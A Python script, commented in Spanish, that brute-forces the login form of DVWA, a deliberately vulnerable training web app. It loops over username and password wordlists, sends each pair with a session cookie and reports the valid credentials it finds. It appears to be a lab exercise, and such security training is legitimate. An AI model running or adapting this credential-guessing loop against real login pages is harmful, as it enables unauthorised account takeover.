#!/usr/bin/env python3
"""Ataque de fuerza bruta controlado contra DVWA usando requests.

Uso exclusivo en entorno de laboratorio autorizado.
"""

from __future__ import annotations

import argparse
import sys
import time
from dataclasses import dataclass
from pathlib import Path

import requests


SUCCESS_MARKER = "Welcome to the password protected area"
FAILURE_MARKER = "Username and/or password incorrect."


@dataclass
class AttackConfig:
    base_url: str
    session_id: str
    security: str
    usernames_path: Path
    passwords_path: Path
    delay: float
    timeout: float
    stop_after: int

    @property
    def target_url(self) -> str:
        return self.base_url.rstrip("/") + "/vulnerabilities/brute/"

    @property
    def cookies(self) -> dict[str, str]:
        return {
            "PHPSESSID": self.session_id,
            "security": self.security,
        }

    @property
    def headers(self) -> dict[str, str]:
        return {
            "User-Agent": "python-requests DVWA lab client",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        }


def parse_args() -> AttackConfig:
    parser = argparse.ArgumentParser(
        description="Ejecuta un brute force controlado contra DVWA."
    )
    parser.add_argument("--base-url", default="http://127.0.0.1")
    parser.add_argument("--session-id", required=True, help="Valor de PHPSESSID.")
    parser.add_argument("--security", default="low")
    parser.add_argument(
        "--usernames",
        default="wordlists/usuarios.txt",
        type=Path,
        help="Ruta a la wordlist de usuarios.",
    )
    parser.add_argument(
        "--passwords",
        default="wordlists/passwords.txt",
        type=Path,
        help="Ruta a la wordlist de contraseñas.",
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=0.0,
        help="Pausa en segundos entre intentos.",
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=10.0,
        help="Timeout HTTP por intento.",
    )
    parser.add_argument(
        "--stop-after",
        type=int,
        default=2,
        help="Cantidad de credenciales válidas tras la que se detiene.",
    )
    args = parser.parse_args()

    return AttackConfig(
        base_url=args.base_url,
        session_id=args.session_id,
        security=args.security,
        usernames_path=args.usernames,
        passwords_path=args.passwords,
        delay=args.delay,
        timeout=args.timeout,
        stop_after=args.stop_after,
    )


def load_wordlist(path: Path) -> list[str]:
    if not path.exists():
        raise FileNotFoundError(f"No existe la wordlist: {path}")

    items = [line.strip() for line in path.read_text(encoding="utf-8").splitlines()]
    items = [item for item in items if item and not item.startswith("#")]
    if not items:
        raise ValueError(f"La wordlist está vacía: {path}")
    return items


def build_session(config: AttackConfig) -> requests.Session:
    session = requests.Session()
    session.headers.update(config.headers)
    session.cookies.update(config.cookies)
    return session


def is_successful(response: requests.Response) -> bool:
    body = response.text
    has_success_marker = SUCCESS_MARKER in body
    has_failure_marker = FAILURE_MARKER in body
    return response.status_code == 200 and has_success_marker and not has_failure_marker


def attempt_login(
    session: requests.Session,
    config: AttackConfig,
    username: str,
    password: str,
) -> tuple[bool, requests.Response]:
    params = {
        "username": username,
        "password": password,
        "Login": "Login",
    }
    response = session.get(
        config.target_url,
        params=params,
        timeout=config.timeout,
        allow_redirects=True,
    )
    return is_successful(response), response


def main() -> int:
    config = parse_args()
    usernames = load_wordlist(config.usernames_path)
    passwords = load_wordlist(config.passwords_path)
    session = build_session(config)

    print("[*] Inicio de ataque controlado contra DVWA")
    print(f"[*] URL objetivo: {config.target_url}")
    print(f"[*] Wordlist usuarios: {config.usernames_path}")
    print(f"[*] Wordlist passwords: {config.passwords_path}")
    print(f"[*] Header clave: Cookie=PHPSESSID + security={config.security}")
    print("[*] Validación de éxito: status 200 + marcador de bienvenida")
    print()

    found: list[tuple[str, str, int]] = []

    for username in usernames:
        for password in passwords:
            ok, response = attempt_login(session, config, username, password)
            length = len(response.text)
            status = response.status_code
            print(
                f"[TRY] user={username:<12} pass={password:<12} "
                f"status={status} length={length}"
            )
            if ok:
                found.append((username, password, length))
                print(f"[OK] Credencial válida: {username}:{password}")
                if len(found) >= config.stop_after:
                    print()
                    print("[*] Se alcanzó el límite de credenciales válidas solicitado.")
                    print("[*] Resultados:")
                    for valid_user, valid_pass, valid_length in found:
                        print(
                            f"    - {valid_user}:{valid_pass} "
                            f"(length={valid_length})"
                        )
                    return 0
            if config.delay > 0:
                time.sleep(config.delay)

    print()
    if found:
        print("[*] Ataque finalizado. Credenciales válidas encontradas:")
        for valid_user, valid_pass, valid_length in found:
            print(f"    - {valid_user}:{valid_pass} (length={valid_length})")
        return 0

    print("[!] No se encontraron credenciales válidas con las wordlists cargadas.")
    return 1


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        print("\n[!] Ejecución interrumpida por el usuario.", file=sys.stderr)
        raise SystemExit(130)
